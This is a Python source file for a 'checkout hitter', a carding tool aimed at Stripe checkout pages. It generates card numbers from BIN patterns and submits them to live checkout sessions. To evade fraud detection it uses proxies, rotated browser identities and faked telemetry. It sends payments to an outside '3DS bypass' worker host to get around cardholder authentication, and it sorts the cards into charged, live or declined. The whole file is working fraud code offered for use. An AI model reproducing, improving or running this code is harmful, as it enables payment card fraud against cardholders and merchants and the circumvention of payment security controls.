# hitter.py — Unified Stripe / Whop Checkout Hitter (best hitter)
# aiohttp (bot-compatible) + 3DS2 frictionless completion + proxy +
# random UA / fresh session per card (always looks new).

import os, re, sys, time, random, json, asyncio, base64
from datetime import datetime
from urllib.parse import urlparse, unquote, quote

import aiohttp

# 3DS bypass worker (Cloudflare Worker run locally via worker_server.mjs, or deployed)
# e.g. "http://127.0.0.1:8787"  or "https://your-worker.workers.dev"
STRIPE_3DS_WORKER = os.environ.get("STRIPE_3DS_WORKER", "https://stripe-3ds-bypass.hacker65github1.workers.dev")
WHOP_3DS_WORKER = os.environ.get("WHOP_3DS_WORKER", "https://whop-3ds-bypass.hacker65github1.workers.dev")

# ── UA pool (rotated per session = "always look new") ────────────────
UA_POOL = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", '"Google Chrome";v="131", "Not_A Brand";v="24", "Chromium";v="131"', '"Windows"'),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", '"Google Chrome";v="124", "Not_A Brand";v="24", "Chromium";v="124"', '"Windows"'),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", '"Google Chrome";v="123", "Not_A Brand";v="24", "Chromium";v="123"', '"macOS"'),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", None, None),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15", None, None),
]

def _pick_ua():
    return random.choice(UA_POOL)

# ── Helpers ──────────────────────────────────────────────────────────
def _luhn_check(partial: str) -> str:
    for d in range(10):
        test = partial + str(d)
        total = 0
        rev = test[::-1]
        for i, ch in enumerate(rev):
            n = int(ch)
            if i % 2 == 1:
                n *= 2
                if n > 9: n -= 9
            total += n
        if total % 10 == 0:
            return str(d)
    return "0"

def _get_card_len(card: str) -> int:
    d = re.sub(r"\D", "", card)
    if d[:2] in ("34", "37"): return 15
    if d[:2] in ("30", "36", "38") or d[:3] in ("300", "305"): return 14
    return 16

def _is_amex(card: str) -> bool:
    return re.sub(r"\D", "", card)[:2] in ("34", "37")

def generate_card(bin_pattern: str) -> dict:
    parts = bin_pattern.strip().split("|")
    raw_bin = re.sub(r"[^0-9xX]", "", parts[0])
    mm_pat = parts[1].strip() if len(parts) > 1 else None
    yy_pat = parts[2].strip() if len(parts) > 2 else None
    cvv_pat = parts[3].strip() if len(parts) > 3 else None
    card = "".join(str(random.randint(0, 9)) if c in "xX" else c for c in raw_bin)
    tlen = _get_card_len(card)
    if len(card) >= tlen: card = card[:tlen - 1]
    while len(card) < tlen - 1:
        card += str(random.randint(0, 9))
    card += _luhn_check(card)
    yr = datetime.now().year
    mm = (str(int(mm_pat)).zfill(2) if mm_pat and mm_pat.upper() not in ("XX", "X", "") else str(random.randint(1, 12)).zfill(2))
    yy = (str(int(yy_pat))[-2:] if yy_pat and yy_pat.upper() not in ("XX", "X", "") else str(yr + random.randint(1, 6))[-2:])
    cvv_len = 4 if _is_amex(card) else 3
    cvv = (re.sub(r"[xX]", lambda _: str(random.randint(0, 9)), cvv_pat) if cvv_pat and cvv_pat.upper() not in ("XXX", "XXXX", "RND", "RANDOM", "") else str(random.randint(0, 10 ** cvv_len - 1)).zfill(cvv_len))
    yyyy = "20" + yy if len(yy) == 2 else yy
    return {"cc": card, "month": mm, "year": yy, "cvv": cvv, "full": f"{card}|{mm}|{yyyy}|{cvv}"}

def decode_pk_from_url(url: str) -> dict:
    r = {"pk": None, "cs": None, "site": None}
    try:
        m = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if m: r["cs"] = m.group(0)
        if '#' not in url: return r
        hp = unquote(url.split('#')[1])
        try:
            xored = ''.join(chr(b ^ 5) for b in base64.b64decode(hp))
            m = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if m: r["pk"] = m.group(0)
        except Exception:
            pass
    except Exception:
        pass
    return r

def gen_uuid():
    return f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}-{random.getrandbits(16):04x}-{random.getrandbits(16):04x}-{random.getrandbits(48):012x}"

def parse_proxy(raw: str):
    if not raw: return None, None
    raw = raw.strip()
    if raw.startswith(("http://", "https://")):
        parsed = urlparse(raw)
        if parsed.username:
            return f"{parsed.scheme}://{parsed.hostname}:{parsed.port}", aiohttp.BasicAuth(parsed.username, parsed.password or "", encoding="latin1")
        return raw, None
    if "@" in raw:
        creds, hp = raw.rsplit("@", 1)
        user, _, pw = creds.partition(":")
        return f"http://{hp}", aiohttp.BasicAuth(user, pw, encoding="latin1")
    parts = raw.split(":")
    if len(parts) == 4:
        if parts[1].isdigit(): h, p, u, pw = parts
        else: u, pw, h, p = parts
        return f"http://{h}:{p}", aiohttp.BasicAuth(u, pw, encoding="latin1")
    return f"http://{raw}", None


async def test_proxy(proxy: str) -> bool:
    """Quick liveness probe through a proxy. Alive = any HTTP response < 500."""
    if not proxy:
        return True
    proxy_url, proxy_auth = parse_proxy(proxy)
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get("https://api.stripe.com/", proxy=proxy_url, proxy_auth=proxy_auth) as r:
                return r.status < 500
    except Exception:
        return False


class AsyncStripeChecker:
    def __init__(self, url: str, proxy: str = None):
        self.url = url
        self.proxy = proxy
        self.pk = None
        self.cs = None
        self.merchant = "Stripe Checkout"
        self.amount_str = "N/A"
        self.currency = "USD"
        self.success_url = ""
        self.product = ""
        self.details = ""
        self.session = None
        self.ua, self.sec_ch_ua, self.sec_ch_platform = _pick_ua()
        self.tracking = {"muid": gen_uuid(), "sid": gen_uuid(), "guid": gen_uuid()}

    async def _new_session(self):
        await self.close()
        self.ua, self.sec_ch_ua, self.sec_ch_platform = _pick_ua()
        self.tracking = {"muid": gen_uuid(), "sid": gen_uuid(), "guid": gen_uuid()}
        proxy_url, proxy_auth = parse_proxy(self.proxy)
        self.session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=50, ssl=False, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=30, connect=10)
        )
        self.proxy_url, self.proxy_auth = proxy_url, proxy_auth

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()
        self.session = None

    def _headers(self, referer=None):
        h = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": referer or self.url,
            "user-agent": self.ua,
        }
        if self.sec_ch_ua:
            h["sec-ch-ua"] = self.sec_ch_ua
            h["sec-ch-ua-mobile"] = "?0"
            h["sec-ch-ua-platform"] = self.sec_ch_platform
        if self.pk:
            h["Authorization"] = f"Bearer {self.pk}"
        return h

    async def _get(self, url, referer=None):
        async with self.session.get(url, headers=self._headers(referer), proxy=self.proxy_url, proxy_auth=self.proxy_auth, allow_redirects=True) as r:
            return r

    async def _post(self, url, data, referer=None):
        async with self.session.post(url, headers=self._headers(referer), data=data, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
            return r

    async def prefetch(self) -> bool:
        await self._new_session()
        decoded = decode_pk_from_url(self.url)
        self.pk = decoded.get("pk")
        self.cs = decoded.get("cs")
        if not self.pk or not self.cs:
            try:
                async with self.session.get(self.url, headers=self._headers(), proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                    html = await r.text()
                    if not self.cs:
                        m = re.search(r'cs_(live|test)_[A-Za-z0-9]+', html)
                        if m: self.cs = m.group(0)
                    if not self.pk:
                        m = re.search(r'pk_(live|test)_[A-Za-z0-9]+', html)
                        if m: self.pk = m.group(0)
            except Exception:
                pass
        if not self.cs or not self.pk:
            return False
        body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
        try:
            async with self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init", headers=self._headers(), data=body, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                data = await r.json()
        except Exception:
            return False
        if "error" in data:
            return False
        acc = data.get("account_settings", {})
        self.merchant = acc.get("display_name") or acc.get("business_name") or acc.get("business_profile", {}).get("name") or "Stripe Checkout"
        self.success_url = data.get("success_url") or ""
        lig = data.get("line_item_group")
        inv = data.get("invoice")
        li = (lig.get("line_items") or [{}])[0] if lig else {}
        self.product = li.get("description") or li.get("name") or lig.get("description") or ""
        self.details = lig.get("description") or self.product or ""
        amt = 0
        if lig:
            amt = lig.get("total", 0); self.currency = lig.get("currency", "usd").upper()
        elif inv:
            amt = inv.get("total", 0); self.currency = inv.get("currency", "usd").upper()
        else:
            pi = data.get("payment_intent") or {}
            amt = pi.get("amount", 0); self.currency = pi.get("currency", "usd").upper()
        self.amount_str = (f"{amt} {self.currency}" if self.currency in ("JPY","KRW","VND","IDR") else f"{amt/100:.2f} {self.currency}") if amt > 0 else "Trial"
        return True

    async def _complete_3ds_via_worker(self, pi_id, client_secret, next_action, pm_id):
        """Call the CF 3DS-bypass worker (/full) to complete 3DS2 frictionless."""
        body = {
            "publishableKey": self.pk,
            "paymentIntentId": pi_id,
            "clientSecret": client_secret,
            "nextAction": next_action,
            "referer": self.url,
            "paymentMethod": pm_id,
        }
        try:
            async with self.session.post(f"{STRIPE_3DS_WORKER}/full", json=body,
                                         headers={"content-type": "application/json"},
                                         timeout=aiohttp.ClientTimeout(total=60)) as r:
                res = await r.json()
        except Exception:
            return "3DS"
        status = (res.get("status") or "").lower()
        if status == "succeeded":
            return "CHARGED"
        if res.get("bypassed"):
            # fingerprint done -> real issuer result (decline or paid)
            if status in ("processing", "requires_capture"):
                return "CHARGED"
            return "DECLINED"
        return "3DS"

    async def charge_card(self, card: dict) -> dict:
        result = {"card": card["full"], "status": "ERROR", "message": "Unknown error"}
        try:
            cs_to_use = self.cs
            init_body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            async with self.session.post(f"https://api.stripe.com/v1/payment_pages/{cs_to_use}/init", headers=self._headers(), data=init_body, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                init_data = await r.json()
            if "error" in init_data:
                result["status"] = "DECLINED"; result["message"] = init_data["error"].get("message", "Init failed")
                return result

            email = init_data.get("customer_email") or f"john_{random.randint(100,999)}@example.com"
            checksum = init_data.get("init_checksum", "")
            lig = init_data.get("line_item_group"); inv = init_data.get("invoice")
            if lig: total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
            elif inv: total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
            else:
                pi = init_data.get("payment_intent") or {}; total = subtotal = pi.get("amount", 0)
            cust = init_data.get("customer") or {}; addr = cust.get("address") or {}
            name = cust.get("name") or "John Smith"
            country = addr.get("country") or "US"
            line1 = addr.get("line1") or "476 West White Mountain Blvd"
            city = addr.get("city") or "Pinetop"; state = addr.get("state") or "AZ"; zip_code = addr.get("postal_code") or "85929"

            self.session.cookie_jar.update_cookies({"__stripe_mid": self.tracking["muid"], "__stripe_sid": self.tracking["sid"]})

            pm_body = (
                f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
                f"&card[exp_month]={card['month']}&card[exp_year]={card['year'][-2:]}"
                f"&billing_details[name]={quote(name)}&billing_details[email]={quote(email)}"
                f"&billing_details[address][country]={country}&billing_details[address][line1]={quote(line1)}"
                f"&billing_details[address][city]={quote(city)}&billing_details[address][postal_code]={zip_code}"
                f"&billing_details[address][state]={state}&key={self.pk}"
                f"&muid={self.tracking['muid']}&sid={self.tracking['sid']}&guid={self.tracking['guid']}"
                f"&payment_user_agent={quote('stripe.js/f5e714652c; stripe-js-v3/f5e714652c; checkout')}"
                f"&time_on_page={random.randint(25000, 55000)}&pasted_fields={quote('number')}"
            )
            async with self.session.post("https://api.stripe.com/v1/payment_methods", headers=self._headers(), data=pm_body, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                pm = await r.json()
            if "error" in pm:
                result["status"] = "DECLINED"; result["message"] = pm["error"].get("message", "Card tokenization error")
                return result
            pm_id = pm.get("id")
            if not pm_id:
                result["status"] = "ERROR"; result["message"] = "No Payment Method"; return result

            conf_body = (
                f"eid=NA&payment_method={pm_id}&expected_amount={total}"
                f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                f"&expected_payment_method_type=card&key={self.pk}&init_checksum={quote(checksum)}"
                f"&muid={self.tracking['muid']}&sid={self.tracking['sid']}&guid={self.tracking['guid']}"
            )
            async with self.session.post(f"https://api.stripe.com/v1/payment_pages/{cs_to_use}/confirm", headers=self._headers(), data=conf_body, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                conf = await r.json()

            if "error" in conf:
                err = conf["error"]; dc = err.get("decline_code", ""); msg = err.get("message", "Failed")
                if "captcha" in msg.lower() or err.get("code") == "captcha_required":
                    result["status"] = "HCAPTCHA"; result["message"] = "Hcaptcha Required"
                elif dc in ("challenge_required", "require_action") or err.get("code") in ("challenge_required", "require_action"):
                    result["status"] = "3DS"; result["message"] = "3DS"
                elif dc in ("incorrect_cvc", "insufficient_funds", "incorrect_cvv") or any(x in msg.lower() for x in ["security code is incorrect", "insufficient funds", "cvc is incorrect", "cvv is incorrect", "incorrect cvv"]):
                    result["status"] = "LIVE"; result["message"] = f"{dc.upper()}: {msg}" if dc else msg
                else:
                    result["status"] = "DECLINED"; result["message"] = f"{dc.upper()}: {msg}" if dc else msg
                return result

            pi = conf.get("payment_intent") or {}
            st = pi.get("status", "") or conf.get("status", "")
            if st == "succeeded":
                result["status"] = "CHARGED"; result["message"] = "Payment successful"
            elif st == "requires_action":
                out = await self._complete_3ds_via_worker(
                    pi.get("id", ""), pi.get("client_secret", ""), pi.get("next_action", {}), pm_id
                )
                if out == "CHARGED":
                    result["status"] = "CHARGED"; result["message"] = "Payment successful (3DS bypassed)"
                elif out == "DECLINED":
                    result["status"] = "DECLINED"; result["message"] = "Card declined (3DS bypassed)"
                else:
                    result["status"] = "3DS"; result["message"] = "3DS"
            elif st == "requires_payment_method":
                err_pi = pi.get("last_payment_error") or {}
                code = err_pi.get("decline_code", ""); msg = err_pi.get("message", "Card declined")
                if "captcha" in msg.lower() or code == "captcha_required":
                    result["status"] = "HCAPTCHA"; result["message"] = "Hcaptcha Required"
                elif code in ("incorrect_cvc", "insufficient_funds", "incorrect_cvv") or any(x in msg.lower() for x in ["security code is incorrect", "insufficient funds", "cvc is incorrect", "cvv is incorrect", "incorrect cvv"]):
                    result["status"] = "LIVE"; result["message"] = f"{code} - {msg}"
                else:
                    result["status"] = "DECLINED"; result["message"] = f"{code} - {msg}"
            else:
                result["status"] = "ERROR"; result["message"] = f"Unknown status: {st}"
        except Exception as e:
            result["status"] = "ERROR"; result["message"] = str(e)[:80]
        return result

    async def check(self, card: dict, proxy: str = None) -> dict:
        """One card check with a fresh session + fresh UA (looks new every time)."""
        self.proxy = proxy or self.proxy
        await self._new_session()
        if not await self.prefetch():
            return {
                "card": card["full"], "status": "ERROR", "message": "Could not init checkout",
                "merchant": self.merchant, "amount": self.amount_str, "currency": self.currency,
                "success_url": self.success_url, "link": self.url,
                "product": self.product, "details": self.details,
            }
        r = await self.charge_card(card)
        await self.close()
        r["merchant"] = self.merchant
        r["amount"] = self.amount_str
        r["currency"] = self.currency
        r["success_url"] = self.success_url
        r["link"] = self.url
        r["product"] = self.product
        r["details"] = self.details
        return r
